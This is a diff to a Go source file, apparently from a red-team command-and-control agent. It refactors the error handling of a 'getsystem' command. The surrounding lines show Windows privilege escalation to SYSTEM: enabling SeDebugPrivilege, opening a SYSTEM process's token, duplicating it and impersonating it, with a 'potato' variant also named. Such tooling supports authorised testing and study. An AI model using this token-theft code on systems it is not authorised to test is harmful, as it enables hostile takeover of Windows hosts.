@@ -32,11 +32,7 @@ func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
 	var args getSystemArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to parse parameters: %v", err)
 		}
 	}
 
@@ -54,11 +50,7 @@ func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
 	case "potato":
 		return getSystemViaPotato(oldIdentity)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown technique: %s. Available: steal, potato", args.Technique),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown technique: %s. Available: steal, potato", args.Technique)
 	}
 }
 
@@ -68,11 +60,7 @@ func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
 func getSystemViaSteal(oldIdentity string) structs.CommandResult {
 	// Enable SeDebugPrivilege to access SYSTEM processes
 	if err := enableDebugPrivilege(); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to enable SeDebugPrivilege: %v (need admin privileges)", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to enable SeDebugPrivilege: %v (need admin privileges)", err)
 	}
 
 	// Find a SYSTEM process to steal from
@@ -83,11 +71,7 @@ func getSystemViaSteal(oldIdentity string) structs.CommandResult {
 	// 4. Any process running as SYSTEM
 	systemPID, processName, err := findSystemProcess()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to find a SYSTEM process: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to find a SYSTEM process: %v", err)
 	}
 
 	// Revert any existing impersonation first
@@ -99,11 +83,7 @@ func getSystemViaSteal(oldIdentity string) structs.CommandResult {
 		// Try with limited information access
 		hProcess, err = windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, systemPID)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("OpenProcess failed for PID %d (%s): %v", systemPID, processName, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("OpenProcess failed for PID %d (%s): %v", systemPID, processName, err)
 		}
 	}
 	defer windows.CloseHandle(hProcess)
@@ -115,11 +95,7 @@ func getSystemViaSteal(oldIdentity string) structs.CommandResult {
 		// Fall back to specific rights
 		err = windows.OpenProcessToken(hProcess, STEAL_TOKEN_ACCESS, &hToken)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("OpenProcessToken failed for PID %d (%s): %v", systemPID, processName, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("OpenProcessToken failed for PID %d (%s): %v", systemPID, processName, err)
 		}
 	}
 
@@ -145,11 +121,7 @@ func getSystemViaSteal(oldIdentity string) structs.CommandResult {
 		)
 		if err != nil {
 			hToken.Close()
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("DuplicateTokenEx failed: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("DuplicateTokenEx failed: %v", err)
 		}
 	}
 	hToken.Close()
@@ -157,21 +129,13 @@ func getSystemViaSteal(oldIdentity string) structs.CommandResult {
 	// Store the SYSTEM token using existing infrastructure
 	if err := SetIdentityToken(duplicatedToken); err != nil {
 		windows.CloseHandle(windows.Handle(duplicatedToken))
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to impersonate SYSTEM token: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to impersonate SYSTEM token: %v", err)
 	}
 
 	// Verify
 	newIdentity, err := GetCurrentIdentity()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Token stolen but failed to verify identity: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Token stolen but failed to verify identity: %v", err)
 	}
 
 	var sb strings.Builder
@@ -183,11 +147,7 @@ func getSystemViaSteal(oldIdentity string) structs.CommandResult {
 	sb.WriteString(fmt.Sprintf("New: %s\n", newIdentity))
 	sb.WriteString("Use rev2self to revert to original context")
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // findSystemProcess enumerates processes and finds one running as NT AUTHORITY\SYSTEM.
